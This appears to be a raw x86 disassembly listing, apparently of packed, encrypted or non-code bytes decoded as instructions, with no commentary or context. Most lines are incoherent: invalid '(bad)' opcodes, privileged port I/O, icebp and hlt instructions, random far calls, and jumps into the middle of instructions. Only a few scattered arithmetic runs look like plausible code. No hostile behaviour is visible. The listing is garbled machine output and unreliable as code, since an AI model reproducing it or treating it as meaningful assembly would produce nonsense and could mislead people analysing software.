  40ce63:	rcl    DWORD PTR [edi],0x8a
  40ce66:	pushf  
  40ce67:	xor    ah,BYTE PTR [ebx+0x16]
  40ce6a:	call   0x31ae:0x36ffc94f
  40ce71:	aad    0xfd
  40ce73:	cs sbb edx,DWORD PTR ds:[esi]
  40ce77:	in     eax,dx
  40ce78:	call   DWORD PTR [eax+0x33]
  40ce7b:	ficomp WORD PTR [eax+0x6]
  40ce7e:	inc    edi
  40ce7f:	xchg   edx,eax
  40ce80:	test   eax,0x86939e78
  40ce85:	jecxz  0x40ce42
  40ce87:	cld    
  40ce88:	sub    eax,0x90a6f0dd
  40ce8d:	icebp  
  40ce8e:	sbb    dl,0xc4
  40ce91:	aaa    
  40ce92:	push   ecx
  40ce93:	rcl    BYTE PTR [edi+0x1be1604c],cl
  40ce99:	fistp  DWORD PTR [ebx-0x532cfbf5]
  40ce9f:	(bad)  
  40cea0:	stc    
  40cea1:	cmp    esp,DWORD PTR [esi+0x59]
  40cea4:	loop   0x40ceaf
  40cea6:	aad    0xad
  40cea8:	lea    ebp,[edi]
  40ceaa:	sub    BYTE PTR [edi+0x636d45e0],bh
  40ceb0:	jle    0x40cf14
  40ceb2:	ret    0x7606
  40ceb5:	jae    0x40ce4c
  40ceb7:	dec    ebx
  40ceb8:	mov    dl,0x56
  40ceba:	arpl   WORD PTR [ebx-0x24],di
  40cebd:	fs das 
  40cebf:	jne    0x40ce4f
  40cec1:	mov    esi,0xd3e36599
  40cec6:	sub    bh,dh
  40cec8:	mov    ah,0x48
  40ceca:	jno    0x40ce7e
  40cecc:	xchg   edi,eax
  40cecd:	aas    
  40cece:	out    dx,eax
  40cecf:	xchg   esi,eax
  40ced0:	mov    ds:0x3a2c84c,eax
  40ced5:	(bad)  [ecx-0x73]
  40ced8:	cli    
  40ced9:	push   0xffffff94
  40cedb:	cld    
  40cedc:	hlt    
  40cedd:	pop    ebp
  40cede:	lods   eax,DWORD PTR ds:[esi]
  40cedf:	pushf  
  40cee0:	enter  0x3958,0x6
  40cee4:	mov    edi,0x5eb5c164
  40cee9:	sbb    ebx,esp
  40ceeb:	add    al,0x86
  40ceed:	out    dx,al
  40ceee:	hlt    
  40ceef:	jl     0x40cf3c
  40cef1:	mov    ds:0xffd6de10,eax
  40cef6:	mov    ah,0xb6
  40cef8:	mov    eax,ds:0x937b8a65
  40cefd:	ins    BYTE PTR es:[edi],dx
  40cefe:	fist   DWORD PTR [ecx-0x3fef696]
  40cf04:	add    al,0x82
  40cf06:	or     BYTE PTR [esi-0x1952c7b6],ch
  40cf0c:	fwait
  40cf0d:	pusha  
  40cf0e:	jmp    0x40cf06
  40cf10:	repnz push ss
  40cf12:	gs xchg esi,eax
  40cf14:	out    0x98,eax
  40cf16:	add    esi,DWORD PTR ds:0xdbdec223
  40cf1c:	adc    bh,BYTE PTR [ecx+0x58]
  40cf1f:	jmp    0x2f1a:0xc6117c0f
  40cf26:	fisubr WORD PTR ds:0x20c390bb
  40cf2c:	sahf   
  40cf2d:	retf   0xc008
  40cf30:	mov    ds:0x64511be2,al
  40cf35:	sahf   
  40cf36:	push   ds
  40cf37:	fwait
  40cf38:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cf39:	push   es
  40cf3a:	adc    DWORD PTR [edi-0x968ea20],esp
  40cf40:	std    
  40cf41:	test   BYTE PTR [ebx+0x28],bl
  40cf44:	dec    ecx
  40cf45:	push   ds
  40cf46:	sar    DWORD PTR [esi],cl
  40cf48:	into   
  40cf49:	clc    
  40cf4a:	ds jno 0x40cf24
  40cf4d:	cmc    
  40cf4e:	in     al,0x23
  40cf50:	push   es
  40cf51:	cmp    al,0xf9
  40cf53:	jg     0x40cf71
  40cf55:	dec    ebp
  40cf56:	into   
  40cf57:	and    eax,0xd0c7ad17
  40cf5c:	out    0xee,eax
  40cf5e:	cwde   
  40cf5f:	aaa    
  40cf60:	mov    bh,0x64
  40cf62:	bnd ss je 0x40cf27
  40cf66:	out    0x83,al
  40cf68:	repnz dec ecx
  40cf6a:	and    eax,DWORD PTR [eax]
  40cf6c:	pop    ds
  40cf6d:	scas   eax,DWORD PTR es:[edi]
  40cf6e:	xor    dh,ch
  40cf70:	xor    bh,BYTE PTR [eax]
  40cf72:	mov    edi,0x31da6a4d
  40cf77:	push   esi
  40cf78:	mov    eax,0xf966d8dc
  40cf7d:	loopne 0x40cfe3
  40cf7f:	xor    BYTE PTR [ebx+ecx*2],ch
  40cf82:	(bad)  
  40cf83:	pusha  
  40cf84:	push   edi
  40cf85:	popa   
  40cf86:	or     BYTE PTR [eax+0x27774836],ch
  40cf8c:	icebp  
  40cf8d:	pushf  
  40cf8e:	push   0x18
  40cf90:	inc    ebp
  40cf91:	jne    0x40d005
  40cf93:	test   DWORD PTR [eax],edi
  40cf95:	and    al,0x2f
  40cf97:	repnz and esp,edi
  40cf9a:	stos   BYTE PTR es:[edi],al
  40cf9b:	pusha  
  40cf9c:	dec    edi
  40cf9d:	pushf  
  40cf9e:	mov    fs,WORD PTR ds:0x2754f3c3
  40cfa4:	or     esp,DWORD PTR [eax+eiz*8-0x6c]
  40cfa8:	pop    ebp
  40cfa9:	out    dx,al
  40cfaa:	mov    ebp,DWORD PTR [ebx-0x56]
  40cfad:	arpl   WORD PTR [ecx-0x1c],ax
  40cfb0:	pop    ebp
  40cfb1:	dec    edx
  40cfb2:	ror    DWORD PTR [ebp-0x60],1
  40cfb5:	(bad)  
  40cfb6:	stc    
  40cfb7:	jle    0x40d018
  40cfb9:	iret   
  40cfba:	xchg   esi,eax
  40cfbb:	xchg   edi,eax
  40cfbc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cfbd:	jne    0x40d01a
  40cfbf:	mov    al,0x2a
  40cfc1:	pop    edi
  40cfc2:	cs push ss
  40cfc4:	lock xchg ebx,eax
  40cfc6:	hlt    
  40cfc7:	jb     0x40cf57
  40cfc9:	push   esp
  40cfca:	fld    QWORD PTR [ebx+ebp*4+0x16b53f28]
  40cfd1:	adc    eax,DWORD PTR [ebx-0x102e2b00]
  40cfd7:	outs   dx,DWORD PTR ds:[esi]
  40cfd8:	in     eax,dx
  40cfd9:	inc    edi
  40cfda:	outs   dx,BYTE PTR ds:[esi]
  40cfdb:	or     edi,DWORD PTR [ebx+ebp*8-0x51e35449]
  40cfe2:	xchg   ebp,eax
  40cfe3:	call   FWORD PTR [edx-0x54]
  40cfe6:	fnsave [eax+0x2d5f414d]
  40cfec:	dec    ebx
  40cfed:	fisubr WORD PTR [eax]
  40cfef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cff0:	add    eax,0xb9f1c93c
  40cff5:	sub    DWORD PTR [edx+esi*2+0x36059b43],ebp
  40cffc:	jl     0x40cfd2
  40cffe:	(bad)
  40d001:	adc    BYTE PTR [eax+0x6e7fa348],dl
  40d007:	cmp    bh,al
  40d009:	push   ecx
  40d00a:	out    dx,al
  40d00b:	scas   al,BYTE PTR es:[edi]
  40d00c:	push   ds
  40d00d:	and    BYTE PTR [edx-0x2f],dh
  40d010:	jb     0x40cfc4
  40d012:	leave  
  40d013:	lods   al,BYTE PTR ds:[esi]
  40d014:	(bad)  
  40d015:	stos   DWORD PTR es:[edi],eax
  40d016:	inc    edx
  40d017:	ins    BYTE PTR es:[edi],dx
  40d018:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d019:	sbb    ah,BYTE PTR [bp+si+0x5f]
  40d01d:	lds    esp,FWORD PTR [edi+ebp*1+0x45546986]
  40d024:	mov    ebp,0x92534757
  40d029:	add    dl,bh
  40d02b:	fyl2xp1 
  40d02d:	or     eax,edx
  40d02f:	fcom   DWORD PTR [edi]
  40d031:	and    DWORD PTR [esi],0x3c2657a4
  40d037:	mov    dh,0xed
  40d039:	sub    eax,DWORD PTR [ecx+0xc]
  40d03c:	or     edx,DWORD PTR [edi]
  40d03e:	test   DWORD PTR [esi],esi
  40d040:	ja     0x40d005
  40d042:	jo     0x40d010
  40d044:	inc    ebp
  40d045:	bound  ebx,QWORD PTR [eax-0x4e]
  40d048:	mov    cl,0x4c
  40d04a:	dec    edi
  40d04b:	mov    al,ds:0xf50e8dd9
  40d050:	jp     0x40cff5
  40d052:	sbb    edi,DWORD PTR [edx-0x7e5fad00]
  40d058:	sahf   
  40d059:	cdq    
  40d05a:	sub    esi,DWORD PTR [edx-0x6a]
  40d05d:	mov    ah,BYTE PTR [esi]
  40d05f:	out    dx,eax
  40d060:	ins    DWORD PTR es:[edi],dx
  40d061:	sbb    al,0xe4
  40d063:	(bad)  
  40d064:	call   0x13b49c22
  40d069:	inc    ebx
  40d06a:	loope  0x40d02a
  40d06c:	pop    ss
  40d06d:	int3   
  40d06e:	sti    
  40d06f:	xchg   esi,eax
  40d070:	xor    BYTE PTR [edi-0x4d],0x90
  40d074:	(bad)  
  40d075:	(bad)  
  40d076:	lfs    edx,FWORD PTR [edi+0x1a]
  40d07a:	or     al,ah
  40d07c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d07d:	mov    ecx,0xb2bf9aa3
  40d082:	pop    edi
  40d083:	call   0x1736:0x98df347a
  40d08a:	pop    edi
  40d08b:	fsub   QWORD PTR ds:0x7fc16a77
  40d091:	cmp    edx,DWORD PTR [esi+0x7c]
  40d094:	push   ecx
  40d095:	pop    esp
  40d096:	je     0x40d087
  40d098:	dec    esp
  40d099:	pop    ebp
  40d09a:	jo     0x40d05c
  40d09c:	stos   BYTE PTR es:[edi],al
  40d09d:	addr16 je 0x40d0de
  40d0a0:	out    0x1a,eax
  40d0a2:	pusha  
  40d0a3:	dec    edi
  40d0a4:	push   ecx
  40d0a5:	inc    eax
  40d0a6:	int    0x1c
  40d0a8:	sbb    eax,0x11ed7ad9
  40d0ad:	pop    ebx
  40d0ae:	cs stc 
  40d0b0:	push   0x3a2000fa
  40d0b5:	out    0x4e,al
  40d0b7:	jbe    0x40d07b
  40d0b9:	push   esp
  40d0ba:	dec    ebp
  40d0bb:	inc    DWORD PTR [ebx-0x43c4ad05]
  40d0c1:	inc    esi
  40d0c2:	ret    0x860f
  40d0c5:	data16 lock (bad) 
  40d0c8:	dec    DWORD PTR [ebx+0x7d8bf455]
  40d0ce:	fdiv   QWORD PTR [ebx]
  40d0d0:	rol    BYTE PTR [ebx],1
  40d0d2:	ror    DWORD PTR [edi],1
  40d0d4:	scas   eax,DWORD PTR es:[edi]
  40d0d5:	xlat   BYTE PTR ds:[ebx]
  40d0d6:	mov    edi,DWORD PTR [ebp-0x18]
  40d0d9:	xor    edi,eax
  40d0db:	add    edx,edi
  40d0dd:	jmp    0x40d49b
  40d0e2:	xor    ah,BYTE PTR [edi+ecx*8]
  40d0e5:	out    0xcd,al
  40d0e7:	icebp  
  40d0e8:	xor    esp,esi
  40d0ea:	cmp    al,0x59
  40d0ec:	lods   al,BYTE PTR ds:[esi]
  40d0ed:	(bad)  
  40d0ee:	(bad)  
  40d0ef:	hlt    
  40d0f0:	inc    esp
  40d0f1:	hlt    
  40d0f2:	stos   BYTE PTR es:[edi],al
  40d0f3:	popf   
  40d0f4:	jo     0x40d166
  40d0f6:	lahf   
  40d0f7:	jge    0x40d169
  40d0f9:	jo     0x40d156
  40d0fb:	test   DWORD PTR [esi],esi
  40d0fd:	mov    al,ds:0x2745788c
  40d102:	xchg   ebp,eax
  40d103:	and    esi,DWORD PTR [edi-0x32]
  40d106:	inc    esp
  40d107:	push   edi
  40d108:	fsubr  DWORD PTR [eax]
  40d10a:	mov    eax,ds:0xccf401bd
  40d10f:	popa   
  40d110:	sub    edx,esi
  40d112:	pop    ebp
  40d113:	stc    
  40d114:	test   edi,ecx
  40d116:	mov    ecx,0x9b928df1
  40d11b:	rol    DWORD PTR [esi+eax*4-0x73],0x4
  40d120:	sbb    DWORD PTR [ebx],edi
  40d122:	xchg   ebx,eax
  40d123:	pop    ss
  40d124:	pop    edx
  40d125:	aaa    
  40d126:	mov    ebx,0x21b59b20
  40d12b:	hlt    
  40d12c:	cmp    DWORD PTR [esi+ecx*1],esi
  40d12f:	sar    BYTE PTR [ecx+edi*1-0x12],1
  40d133:	loope  0x40d0fb
  40d135:	adc    esp,ecx
  40d137:	push   ecx
  40d138:	lock loop 0x40d123
  40d13b:	outs   dx,BYTE PTR ds:[esi]
  40d13c:	loop   0x40d143
  40d13e:	inc    ebp
  40d13f:	jb     0x40d16f
  40d141:	ret    
  40d142:	mov    dh,0x92
  40d144:	ja     0x40d19d
  40d146:	or     al,0x1e
  40d148:	imul   ecx,DWORD PTR [di],0x5a
  40d14c:	dec    ecx
  40d14d:	dec    ebx
  40d14e:	and    al,cl
  40d150:	and    al,0x4d
  40d152:	cli    
  40d153:	adc    eax,0xb4aa95bb
  40d158:	(bad)  
  40d15a:	add    DWORD PTR [edi],esp
  40d15c:	push   es
  40d15d:	mov    ch,cl
  40d15f:	jge    0x40d136
  40d161:	out    0x24,eax
  40d163:	pop    ds
  40d164:	pop    ds
  40d165:	hlt    
  40d166:	je     0x40d10a
  40d168:	xor    eax,0x754b94af
  40d16d:	jbe    0x40d10e
  40d16f:	push   ss
  40d170:	ss out dx,eax
  40d172:	xchg   esi,eax
  40d173:	mov    dl,0xcf
  40d175:	imul   ebx,esp,0xffffffcd
  40d178:	retf   0x60fe
  40d17b:	js     0x40d190
  40d17d:	aam    0x93
  40d17f:	xchg   BYTE PTR [edi+ecx*1-0x26b92413],dl
  40d186:	sbb    al,0x0
  40d188:	push   ebp
  40d189:	push   0xeae00ea8
  40d18e:	(bad)  
  40d18f:	leave  
  40d190:	jbe    0x40d1f6
  40d192:	sbb    BYTE PTR [esi],0x59
  40d195:	std    
  40d196:	adc    esi,edi
  40d198:	(bad)  
  40d199:	out    0x7c,al
  40d19b:	loop   0x40d1c7
  40d19d:	push   edx
  40d19e:	or     eax,0x1bef149e
  40d1a3:	xor    ah,BYTE PTR [esi+0x112e8f35]
  40d1a9:	outs   dx,DWORD PTR ds:[esi]
  40d1aa:	and    ah,BYTE PTR ds:0xad3cc02d
  40d1b0:	les    esi,FWORD PTR [eax-0x2227a9dc]
  40d1b6:	call   0x220b:0xde24d634
  40d1bd:	outs   dx,BYTE PTR ds:[esi]
  40d1be:	sub    ch,BYTE PTR [esp+ebp*1-0xa]
  40d1c2:	mov    ss,ebp
  40d1c4:	fwait
  40d1c5:	sbb    al,0x72
  40d1c7:	jge    0x40d162
  40d1c9:	xchg   ebp,eax
  40d1ca:	fcom   QWORD PTR [esi]
  40d1cc:	bound  ecx,QWORD PTR [edi+esi*1]
  40d1cf:	loope  0x40d1ec
  40d1d1:	sbb    cl,ah
  40d1d3:	and    edi,DWORD PTR [ecx-0x61]
  40d1d6:	fldenv [esi]
  40d1d8:	or     eax,0x2d05a943
  40d1dd:	pop    ebp
  40d1de:	dec    ecx
  40d1df:	out    dx,eax
  40d1e0:	dec    edi
  40d1e1:	lock popf 
  40d1e3:	push   DWORD PTR [edx]
  40d1e5:	push   fs
  40d1e7:	push   es
  40d1e8:	icebp  
  40d1e9:	xor    al,0xad
  40d1eb:	cld    
  40d1ec:	mov    ds:0x38a59d9c,al
  40d1f1:	push   esi
  40d1f2:	lahf   
  40d1f3:	pop    ds
  40d1f4:	mov    al,ds:0xd0c76e05
  40d1f9:	out    0x57,al
  40d1fb:	push   ds
  40d1fc:	(bad)  
  40d1fd:	mov    edi,0x88640284
  40d202:	xchg   ecx,eax
  40d203:	daa    
  40d204:	mov    DWORD PTR [edx-0x68],ebp
  40d207:	mov    ds:0x8d336c61,eax
  40d20c:	add    edx,DWORD PTR [esp+ecx*2]
  40d20f:	mov    edi,0xcdaa8f2c
  40d214:	pop    eax
  40d215:	sub    eax,0x10d97e91
  40d21a:	and    al,0x5a
  40d21c:	in     eax,dx
  40d21d:	mov    ?,WORD PTR [edi]
  40d21f:	outs   dx,DWORD PTR ds:[esi]
  40d220:	sbb    eax,DWORD PTR [esi+0x767b8ad8]
  40d226:	mov    ecx,0x196594e0
  40d22b:	aam    0x85
  40d22d:	ror    DWORD PTR [edi+0x1bd258b0],1
  40d233:	mov    edx,0x151c6f8a
  40d238:	(bad)
  40d23b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d23c:	pop    edx
  40d23d:	mov    ebx,0xb2b81abb
  40d242:	sti    
  40d243:	test   BYTE PTR [ebx-0xa],0x67
  40d247:	in     al,dx
  40d248:	or     DWORD PTR [eax],esp
  40d24a:	mov    ebp,0xf1303fef
  40d24f:	mov    ch,0x37
  40d251:	jl     0x40d2ac
  40d253:	sub    DWORD PTR [eax+0x58143a4b],eax
  40d259:	push   ecx
  40d25a:	mov    al,0xc1
  40d25c:	test   BYTE PTR [ebx+edx*8-0x584f5231],ch
  40d263:	mov    BYTE PTR [ebx],al
  40d265:	out    0xb8,eax
  40d267:	pop    esi
  40d268:	iret   
  40d269:	call   0x38f9:0xb80872e3
  40d270:	sub    esp,DWORD PTR [edi]
  40d272:	xor    BYTE PTR [edi+0x4e],0x94
  40d276:	pop    esi
  40d277:	mov    cl,0xc2
  40d279:	jmp    0xce0308bd
  40d27e:	push   0x8957b50
  40d283:	mov    eax,ds:0xa499f2dd
  40d288:	cdq    
  40d289:	dec    ebx
  40d28a:	dec    BYTE PTR [eax-0x24c64fe1]
  40d290:	retf   
  40d291:	cmp    al,0x1d
  40d293:	and    cl,BYTE PTR [edi-0x66]
  40d296:	inc    ebp
  40d297:	pop    ebx
  40d298:	push   ss
  40d299:	ja     0x40d259
  40d29b:	lea    esp,[ebp-0x24]
  40d29e:	push   edx
  40d29f:	cdq    
  40d2a0:	add    DWORD PTR [edx-0x5a],esi
  40d2a3:	inc    ebx
  40d2a4:	or     cl,ah
  40d2a6:	jo     0x40d237
  40d2a8:	jns    0x40d25c
  40d2aa:	and    BYTE PTR [edi-0x6f],bl
  40d2ad:	fst    DWORD PTR [ebx]
  40d2af:	jecxz  0x40d241
  40d2b1:	jecxz  0x40d2f1
  40d2b3:	aas    
  40d2b4:	or     cl,dh
  40d2b6:	rcl    DWORD PTR [esi],1
  40d2b8:	cwde   
  40d2b9:	arpl   WORD PTR [edx],bp
  40d2bb:	test   eax,0x9c3f35a0
  40d2c0:	jg     0x40d2b1
  40d2c2:	mov    ebp,0x17f1b35e
  40d2c7:	pop    esi
  40d2c8:	dec    ebp
  40d2c9:	gs push ds
  40d2cb:	pop    ebp
  40d2cc:	sbb    ebp,ebp
  40d2ce:	lock adc ah,0x4d
  40d2d2:	mov    esi,gs
  40d2d4:	pop    esp
  40d2d5:	mov    ecx,0xd73dc6f7
  40d2da:	add    dh,0x5e
  40d2dd:	cld    
  40d2de:	mov    esp,0xe3c39aed
  40d2e3:	or     DWORD PTR [esi+0x23347e04],ebx
  40d2e9:	or     BYTE PTR [eax],ah
  40d2eb:	mov    esp,0x26ae5c2b
  40d2f0:	lods   al,BYTE PTR ds:[esi]
  40d2f1:	inc    ecx
  40d2f2:	stos   DWORD PTR es:[edi],eax
  40d2f3:	inc    esi
  40d2f4:	sub    al,0xf7
  40d2f6:	icebp  
  40d2f7:	test   BYTE PTR [edi+0x5ba231f0],cl
  40d2fd:	jb     0x40d2d5
  40d2ff:	aas    
  40d300:	pop    ebp
  40d302:	xor    DWORD PTR [edi],esp
  40d304:	push   ebx
  40d305:	stc    
  40d306:	dec    ecx
  40d307:	or     BYTE PTR [edi+edx*8],ah
  40d30a:	jmp    0xe496:0xa8aed7b3
  40d311:	stc    
  40d312:	(bad)  
  40d313:	pushf  
  40d314:	cmp    BYTE PTR [ecx+0x1e5df1b1],dl
  40d31a:	test   edx,0x47becc5b
  40d320:	sbb    eax,0xda1d743f
  40d325:	jl     0x40d300
  40d327:	dec    ebx
  40d328:	adc    al,0xe8
  40d32a:	jae    0x40d334
  40d32c:	mov    ebx,ecx
  40d32e:	mov    BYTE PTR [edi+0x25dbc1d7],ch
  40d334:	sbb    al,0x97
  40d336:	jb     0x40d332
  40d338:	pop    ebp
  40d339:	rcr    BYTE PTR [edx-0x7e6d893],1
  40d33f:	outs   dx,BYTE PTR ds:[esi]
  40d340:	ins    DWORD PTR es:[edi],dx
  40d341:	xor    al,0x67
  40d343:	inc    ebp
  40d344:	cmp    dh,bh
  40d346:	mov    ecx,0xd0ef45bc
  40d34b:	jnp    0x40d3bd
  40d34d:	popa   
  40d34e:	inc    esp
  40d34f:	imul   eax,ebx,0xccdd17f3
  40d355:	dec    esi
  40d356:	mov    al,0xd7
  40d358:	jp     0x40d340
  40d35a:	fistp  WORD PTR [esi]
  40d35c:	push   ebx
  40d35d:	or     dl,BYTE PTR [esi-0x4244d570]
  40d363:	out    0xf5,al
  40d365:	lods   al,BYTE PTR ds:[esi]
  40d366:	std    
  40d367:	mov    ebp,esp
  40d369:	push   0x88c00357
  40d36e:	test   DWORD PTR [esi-0x4e],esi
  40d371:	jmp    0x40d335
  40d373:	ds mov esp,0x7815556d
  40d379:	test   eax,0x5e09f08f
  40d37e:	loope  0x40d3ab
  40d380:	pop    edx
  40d381:	cmp    esp,DWORD PTR [ebp-0x23a06d62]
  40d387:	retf   0x3ea3
  40d38a:	cmp    BYTE PTR [edi+0x4c2261c8],0xbc
  40d391:	std    
  40d392:	out    dx,al
  40d393:	outs   dx,DWORD PTR ds:[esi]
  40d394:	mov    cl,0x73
  40d396:	cbw    
  40d398:	test   al,0x43
  40d39a:	or     DWORD PTR [edx+0x5b8977e],esi
  40d3a0:	enter  0x72f6,0x36
  40d3a4:	cmp    eax,0x172c7ad3
  40d3a9:	push   esi
  40d3aa:	adc    ebx,DWORD PTR [edi]
  40d3ac:	(bad)  
  40d3ad:	jns    0x40d348
  40d3af:	mov    ah,0x20
  40d3b1:	xchg   esp,eax
  40d3b2:	xchg   edx,eax
  40d3b3:	js     0x40d36a
  40d3b5:	ins    BYTE PTR es:[edi],dx
  40d3b6:	sub    bl,BYTE PTR [ebp+edx*8+0x37]
  40d3ba:	push   es
  40d3bb:	stos   DWORD PTR es:[edi],eax
  40d3bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d3bd:	lods   eax,DWORD PTR ds:[esi]
  40d3be:	push   es
  40d3bf:	adc    edx,esi
  40d3c1:	sbb    eax,0xf876c886
  40d3c6:	lods   eax,DWORD PTR ds:[esi]
  40d3c7:	out    dx,al
  40d3c8:	iret   
  40d3c9:	inc    eax
  40d3ca:	dec    edi
  40d3cb:	push   es
  40d3cc:	jo     0x40d3fd
  40d3ce:	hlt    
  40d3cf:	jbe    0x40d406
  40d3d1:	mov    eax,ds:0x1a06c88
  40d3d6:	jle    0x40d381
  40d3d8:	xor    BYTE PTR [esi+0x2c],bh
  40d3db:	pop    ss
  40d3dc:	pop    ebx
  40d3dd:	mov    eax,ds:0xf64261fb
  40d3e2:	or     eax,0xf9005e72
  40d3e7:	pop    ebp
  40d3e8:	fsubr  QWORD PTR [edi+0x30]
  40d3eb:	or     BYTE PTR [ebx+0x7e6fa0af],dh
  40d3f1:	push   0x8
  40d3f3:	test   al,0x40
  40d3f5:	add    BYTE PTR [edi],ah
  40d3f7:	cwde   
  40d3f8:	push   ds
  40d3f9:	aas    
  40d3fa:	call   0xa9a6:0x8435ddec
  40d401:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d402:	enter  0x9871,0x41
  40d406:	outs   dx,DWORD PTR ds:[esi]
  40d407:	pop    es
  40d408:	pop    ds
  40d409:	fdivr  QWORD PTR [ebx]
  40d40b:	dec    ebx
  40d40c:	and    eax,0x8f6397e1
  40d411:	stos   BYTE PTR es:[edi],al
  40d412:	call   0xa3cdf080
  40d417:	jmp    0xce0e7f5c
  40d41c:	or     edi,esi
  40d41e:	push   es
  40d41f:	hlt    
  40d420:	pop    ebx
  40d421:	mov    dh,0x8c
  40d423:	mov    esp,0xfe1c0e6b
  40d428:	jmp    0x2866:0x3780ee5a
  40d42f:	jg     0x40d452
  40d431:	call   0xfe45:0x18119423
  40d438:	jge    0x40d3d8
  40d43a:	cmp    edx,DWORD PTR [esi-0x46]
  40d43d:	push   esi
  40d43e:	fcom   DWORD PTR [ebx-0x2f]
  40d441:	jmp    0x40d436
  40d443:	dec    esp
  40d444:	mov    esi,0x103d80e2
  40d449:	(bad)  
  40d44a:	add    bl,ch
  40d44c:	bound  esi,QWORD PTR [esi]
  40d44e:	add    DWORD PTR [edi-0x12],esi
  40d451:	sbb    BYTE PTR [edx-0x48f7eaa6],ch
  40d457:	sub    edi,ecx
  40d459:	xor    al,0xd3
  40d45b:	rcr    DWORD PTR [ebx+0x65845e97],1
  40d461:	xchg   esi,eax
  40d462:	aas    
  40d463:	mov    cl,0xbc
  40d465:	xor    edi,DWORD PTR [esi]
  40d467:	das    
  40d468:	adc    DWORD PTR [ebx+0x67],edi
  40d46b:	iret   
  40d46c:	(bad)  
  40d46d:	not    bh
  40d46f:	cmp    ebp,DWORD PTR [edx]
  40d471:	jno    0x40d4e6
  40d473:	retf   0x3c8c
  40d476:	js     0x40d471
  40d478:	jb     0x40d418
  40d47a:	mov    ds:0x7d4dae36,al
  40d47f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d480:	out    0x55,al
  40d482:	inc    ebp
  40d483:	call   0x2966:0x435815f3
  40d48a:	adc    BYTE PTR [eax],ah
  40d48c:	es mov ch,0x31
  40d48f:	out    0xda,al
  40d491:	stos   DWORD PTR es:[edi],eax
  40d492:	fwait
  40d493:	or     esi,DWORD PTR [ecx-0x113068b]
  40d499:	std    
  40d49a:	mov    di,WORD PTR [ebp-0x8]
  40d49e:	lea    edx,[edx+edi*1+0x32729c]
  40d4a5:	mov    DWORD PTR [ebp-0x8],edx
  40d4a8:	mov    edx,DWORD PTR [ebp-0x20]
  40d4ab:	xor    edx,eax
  40d4ad:	mov    edi,0xffcd8d64
  40d4b2:	sub    edi,edx
  40d4b4:	jmp    0x40d872
  40d4b9:	out    dx,al
  40d4ba:	inc    ebx
  40d4bb:	push   0x4e
  40d4bd:	jno    0x40d534
  40d4bf:	jmp    0x72d3:0xb81a1d63
  40d4c6:	addr16 in al,dx
  40d4c8:	out    0xc9,al
  40d4ca:	cdq    
  40d4cb:	jo     0x40d53d
  40d4cd:	lahf   
  40d4ce:	jge    0x40d540
  40d4d0:	jo     0x40d463
  40d4d2:	mov    ecx,DWORD PTR [esi*1+0x3f0db475]
  40d4d9:	call   0x5dea:0xdc4df26b
  40d4e0:	jmp    0x40d475
  40d4e2:	dec    edi
  40d4e3:	lds    edi,FWORD PTR [edx]
  40d4e5:	push   0x17
  40d4e7:	mov    ch,0xd3
  40d4e9:	mov    edx,0x736bf223
  40d4ee:	(bad)  
  40d4ef:	mov    ds:0x9050e43d,eax
  40d4f4:	stc    
  40d4f5:	lock lods al,BYTE PTR gs:[esi]
  40d4f8:	aam    0x70
  40d4fa:	and    al,0xc8
  40d4fc:	out    0x1b,eax
  40d4fe:	xchg   dh,al
  40d500:	jo     0x40d4c9
  40d502:	xor    BYTE PTR [ebx+esi*8+0x5f],bh
  40d506:	into   
  40d507:	dec    esi
  40d508:	scas   eax,DWORD PTR es:[edi]
  40d509:	sub    eax,edx
  40d50b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d50c:	pusha  
  40d50d:	in     eax,dx
  40d50e:	xor    BYTE PTR [eax],cl
  40d510:	scas   eax,DWORD PTR es:[edi]
  40d511:	ja     0x40d4c8
  40d513:	outs   dx,DWORD PTR ds:[esi]
  40d514:	or     eax,0xd2e8308a
  40d519:	into   
  40d51a:	sahf   
  40d51b:	pop    eax
  40d51c:	outs   dx,BYTE PTR ds:[esi]
  40d51d:	(bad)  
  40d51e:	jbe    0x40d4dd
  40d520:	test   BYTE PTR [ebp+0xd],ah
  40d523:	lock jo 0x40d59c
  40d526:	cs lahf 
  40d528:	sbb    al,BYTE PTR [ecx]
  40d52a:	out    0x57,al
  40d52c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d52d:	(bad)  
  40d52e:	clc    
  40d52f:	arpl   WORD PTR [ebp+0x34f83f76],bx
  40d535:	pop    edx
  40d536:	lahf   
  40d537:	ins    BYTE PTR es:[edi],dx
  40d538:	lock arpl WORD PTR [eax+0xaa185f7],ax
  40d53f:	sub    ch,BYTE PTR [ebx+0x369f0984]
  40d545:	adc    eax,0xd10923f9
  40d54a:	addr16 jae 0x40d4ee
  40d54d:	pop    ds
  40d54e:	jne    0x40d4ee
  40d550:	sbb    al,0x19
  40d552:	sub    dh,BYTE PTR [eax]
  40d554:	in     al,0x14
  40d556:	ret    0x7065
  40d559:	or     DWORD PTR [edx-0x10],esp
  40d55c:	ja     0x40d53d
  40d55e:	rcl    DWORD PTR [esi+ecx*2+0x23],0x3e
  40d563:	imul   eax,ebp,0xc
  40d566:	add    ah,dh
  40d568:	inc    eax
  40d569:	add    cl,bh
  40d56b:	loope  0x40d50e
  40d56d:	stos   DWORD PTR es:[edi],eax
  40d56e:	aaa    
  40d56f:	call   0x2229:0xa22c620a
  40d576:	mov    bl,0x45
  40d578:	int3   
  40d579:	mov    cl,BYTE PTR [ebx-0x1d481240]
  40d57f:	fdivr  st(6),st
  40d581:	ret    0x6ba3
  40d584:	jb     0x40d511
  40d586:	or     al,BYTE PTR [edx+0x42dd429f]
  40d58c:	lods   eax,DWORD PTR ds:[esi]
  40d58d:	bound  esp,QWORD PTR [ebx+0x7f]
  40d590:	mov    edx,0x2da6157d
  40d595:	mov    al,0x3d
  40d597:	ins    BYTE PTR es:[edi],dx
  40d598:	mov    ds:0xdcc63b22,al
  40d59d:	xlat   BYTE PTR ds:[ebx]
  40d59e:	xor    BYTE PTR [ebp-0x51],dh
  40d5a1:	lods   al,BYTE PTR ds:[esi]
  40d5a2:	fs adc al,0xd1
